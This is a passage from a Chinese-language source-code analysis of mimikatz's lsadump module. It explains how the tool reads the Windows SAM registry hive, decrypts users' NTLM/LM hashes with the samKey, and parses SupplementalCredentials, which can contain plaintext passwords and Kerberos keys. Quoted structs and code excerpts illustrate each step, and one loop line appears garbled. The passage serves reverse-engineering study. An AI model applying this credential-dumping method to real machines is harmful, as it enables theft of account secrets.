                    RtlCopyMemory(*pOut, pData, dwDataLen);
                    if(!(status = CryptDecrypt(hKey, 0, TRUE, 0, (PBYTE) *pOut, dwOutLen)))
获取到samkey之后的操作就是遍历`HKLM\SAM\Domains\Account\Users`，键值的获取和前面讨论的获取键值的流程一致，这里不再赘述，获取用户名和对应的哈希大体流程如下：
1、查询Users对应的键值，获取子键个数即用户的数量  
2、遍历获取用户(Users下面的子键（RID）)  
3、打开子键并获取键值(子键V的值)  
4、解析获取到的键值并使用samKey解密数据得到用户哈希
关键看如何从键值中获取用户名以及对应的哈希，对于获取的数据mimikatz用以下结构体描述：
    typedef struct _SAM_ENTRY {
        DWORD offset;
        DWORD lenght;
        DWORD unk;
    } SAM_ENTRY, *PSAM_SENTRY;
    typedef struct _USER_ACCOUNT_V {
        SAM_ENTRY unk0_header;
        SAM_ENTRY Username;
        SAM_ENTRY Fullname;
        SAM_ENTRY Comment;
        SAM_ENTRY UserComment;
        SAM_ENTRY unk1;
        SAM_ENTRY Homedir;
        SAM_ENTRY HomedirConnect;
        SAM_ENTRY ScriptPath;
        SAM_ENTRY ProfilePath;
        SAM_ENTRY Workstations;
        SAM_ENTRY HoursAllowed;
        SAM_ENTRY unk2;
        SAM_ENTRY LMHash;
        SAM_ENTRY NTLMHash;
        SAM_ENTRY NTLMHistory;
        SAM_ENTRY LMHistory;
        BYTE datas[ANYSIZE_ARRAY];
    } USER_ACCOUNT_V, *PUSER_ACCOUNT_V;
从结构体定义可以看出，我们想要获取的数据在成员datas中，其他成员主要记录了对应的值的长度以及在datas中的偏移，比如要获取用户名即`datas+Username->offset`。这里用户名是明文存储的，所以可以直接获取，但是对应的哈希是以密文的形式存储，解密密钥为前面获取的samKey，解密流程和解密samKey一致，只是在细节上有所差异：
1、采用rc4加密时，生成密钥这里用到了samKey、rid以及固定的字符串如`NTPASSWORDHISTORY`  
2、采用aes128加密时，密钥换成了samKey，其他的于前面基本一致，只是这里描述加密数据的结构体有所变化：
    typedef struct _SAM_HASH_AES {
        WORD PEKID;
        WORD Revision;
        DWORD dataOffset;
        BYTE Salt[SAM_KEY_DATA_SALT_LENGTH];
        BYTE data[ANYSIZE_ARRAY]; // Data
    } SAM_HASH_AES, *PSAM_HASH_AES;
此外，这里解密之后得到的数据依旧不是最终想要的哈希，这是和前面获取samKey最关键的不同之处：
    kuhl_m_lsadump_dcsync_decrypt(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? L"ntlm" : L"NTLM" ) : (isHistory ? L"lm  " : L"LM  "), isHistory);
这个函数内部实际上是调用了`cryptsp.dll`中的函数`SystemFunction027`，其实前面rc4解密调用的函数也是这个dll中的函数：`SystemFunction033`。简单看一下这里的解密操作：
      KeysFromIndex(index, v6);
      result = SystemFunction002(encData, v6, decData);
      if ( (int)result >= 0 )
        return SystemFunction002(encData + 8, v7, decData + 8);
      return result;
其中，`KeysFromIndex`实际上就是根据传入的index生成一个用于解密的key，然后传递到`SystemFunction002`进行解密操作，`SystemFunction002`位于`cryptbase.dll`，实际上是DES解密：
    __int64 __fastcall SystemFunction002(__int64 a1, __int64 a2, __int64 a3)
    {
      __int64 result; // rax
      result = DES_ECB_LM(0i64, a2, a1, a3);
      if ( (_DWORD)result )
        return 3221225473i64;
      return result;
    }
这里其实有套娃的味道了，不过我们可以不用关心具体的解密流程，只需直接调用`SystemFunction027`就可以对数据进行解密进而获得用户哈希了。
在获取到用户的哈希之后还注意到一个函数：`kuhl_m_lsadump_getSupplementalCreds`，函数做的操作是获取RID对应的键的子键`SupplementalCreds`的数据，解析并解密获取对应用户的`SupplementalCredentials`属性，关于这个属性可参见[MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/0705f888-62e1-4a4c-bac0-b4d427f396f8?redirectedfrom=MSDN)
可以重点关注一下MSDN中给的表：
可以看到，这里面是包含了明文密码以及明文密码的哈希的，每个字段的格式在文档中也有说明，感兴趣的可以看看。在mimikatz的代码中，定义了两个结构体，一是描述加密后的数据：
    typedef struct _KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS {
        DWORD unk0;
        DWORD unkSize;
        DWORD unk1; // flags ?
        DWORD originalSize;
        BYTE iv[LAZY_IV_SIZE];
        BYTE encrypted[ANYSIZE_ARRAY];
    } KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS, *PKIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS;
和前面的其实如出一辙，解密密钥同样使用的是samKey，加密算法和解密用户哈希一样也是aes128。另一个结构体则是用来描述具体的SupplementalCredentials信息：
    typedef struct _USER_PROPERTIES {
        DWORD Reserved1;
        DWORD Length;
        USHORT Reserved2;
        USHORT Reserved3;
        BYTE Reserved4[96];
        wchar_t PropertySignature;
        USHORT PropertyCount;
        USER_PROPERTY UserProperties[ANYSIZE_ARRAY];
    } USER_PROPERTIES, *PUSER_PROPERTIES;
属性的签名为`P`，通过成员`PropertyCount`遍历成员`UserProperties`，需要注意的点是每个属性名是UTF-16编码的字符所以在mimikatz中定义了一个名为`UNICODE_STRING`的类型来描述对应的数据：
    #define DECLARE_UNICODE_STRING(_var, _string) \
    const WCHAR _var ## _buffer[] = _string; \
    UNICODE_STRING _var = { sizeof(_string) - sizeof(WCHAR), sizeof(_string), (PWCH) _var ## _buffer }
此外，对于每个属性的描述用结构体`_USER_PROPERTY`
    typedef struct _USER_PROPERTY {
        USHORT NameLength;
        USHORT ValueLength;
        USHORT Reserved;
        wchar_t PropertyName[ANYSIZE_ARRAY];
        // PropertyValue in HEX !
    } USER_PROPERTY, *PUSER_PROPERTY;
每轮遍历结束，寻找下一个属性名就加上NameLength和ValueLength，有点链表的意味，其实可以发现整个hive文件都是这样的形式，通过头记录对应的数据信息，同类型的数据通过大小来计算偏移，不同的数据类型就根据头中的偏移来定位。
每轮遍历首先做的是将属性值转换成hex的格式：
    for(j = 0; j DefaultSaltLength / sizeof(wchar_t), (PWSTR) ((PBYTE) pKerb + pKerb->DefaultSaltOffset));
        pKeyData = (PKERB_KEY_DATA) ((PBYTE) pKerb + sizeof(KERB_STORED_CREDENTIAL));
        pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
        kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
    }
    // kuhl_m_lsadump_lsa_keyDataInfo
    PKERB_KEY_DATA kuhl_m_lsadump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title)
    {
        USHORT i;
        if(Count)
        {
            if(title)
                kprintf(L"    %s\n", title);
            for(i = 0; i < Count; i++)
            {
                kprintf(L"      %s : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType));
                kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
                kprintf(L"\n");
            }
        }
        return (PKERB_KEY_DATA) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA));
    }
其他属性的解析与此类似，相关的结构体可以在`mimikatz\modules\kuhl_m_lsadump.h`中找到，此处不再赘述。